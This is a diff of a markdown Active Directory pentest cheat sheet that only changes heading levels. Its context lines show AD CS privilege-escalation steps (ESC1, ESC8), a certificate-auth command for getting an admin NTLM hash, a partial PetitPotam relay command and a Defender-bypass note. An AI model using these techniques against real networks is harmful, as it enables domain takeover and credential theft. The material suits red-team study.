@@ -237,7 +237,7 @@ If at the current stage you have not been able to move forward within the latera
 Don't forget the techniques for getting a domain administrator using [AD CS](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6). The most common privilege escalation techniques are ESC1 and ESC8.
 
 
-## ESC1 - Template Enrollment Rights abuse - technique understanding:
+### ESC1 - Template Enrollment Rights abuse - technique understanding:
 
 Client Authentication: True + Extended Key Usage: Client Authentication - cert maybe to be used for authentication
 
@@ -264,7 +264,7 @@ certification auth -pfx admin.pfx
 # and get NTLM admin hash
 ```
 
-## ESC8 - NTLM Relay to AD CS HTTP Endpoints - technique understanding:
+### ESC8 - NTLM Relay to AD CS HTTP Endpoints - technique understanding:
 
 Web Enrollment: Enabled - the ability to issue a certificate through a web request
 
@@ -280,7 +280,7 @@ python3 PetitPotam.py attacketip dc.jaki.local --dc-ip 10.10.1.1 --u someuser --
 ```
 
 
-## Additional tricks:
+### Additional tricks:
 
 ```
 Run process as different Powershell user:
@@ -355,7 +355,7 @@ SMB Pipe injection into parent process (Defender Bypass) Cobalt Strike
 ```
 
 
-## Impacket bugs mitigation:
+### Impacket bugs mitigation:
 
 If you have error:
 
